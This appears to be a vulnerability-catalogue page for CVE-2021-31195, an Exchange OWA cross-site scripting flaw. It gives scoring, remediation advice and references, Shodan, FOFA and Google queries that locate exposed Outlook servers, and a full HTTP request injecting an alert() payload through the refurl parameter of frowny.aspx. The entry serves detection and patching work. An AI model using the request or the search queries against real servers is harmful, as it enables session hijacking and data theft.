---
layout: post
cve_id: CVE-2021-31195
title: Microsoft Exchange Server - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2021/CVE-2021-31195.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-31195.yaml
snort2_rule: N/A
snort3_rule: N/A
author: infosecsanyam
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary script code in the context of the user''s browser, potentially
  leading to session hijacking, data theft, or other malicious activities.

  '
remediation: 'Apply the latest security updates provided by Microsoft to mitigate
  this vulnerability.

  '
reference:
- https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195
- https://nvd.nist.gov/vuln/detail/CVE-2021-31195
- https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-31195
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
  cvss-score: 6.5
  cve-id: CVE-2021-31195
  cwe-id: CWE-79
  epss-score: 0.84363
  epss-percentile: 0.99285
  cpe: cpe:2.3:a:microsoft:exchange_server:2013:cumulative_update_23:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: microsoft
  product: exchange_server
  shodan-query:
  - http.title:"Outlook"
  - http.favicon.hash:1768726119
  - http.title:"outlook"
  - cpe:"cpe:2.3:a:microsoft:exchange_server"
  fofa-query:
  - title="outlook"
  - icon_hash=1768726119
  google-query: intitle:"outlook"
tags:
- cve2021
- cve
- microsoft
- exchange
- owa
- xss
- vuln
---

## üîç Vulnerability Description
Microsoft Exchange Server, or OWA, is vulnerable to a cross-site scripting vulnerability in refurl parameter of frowny.asp.

## üåê HTTP Request
```nohighlight
GET /owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)// HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

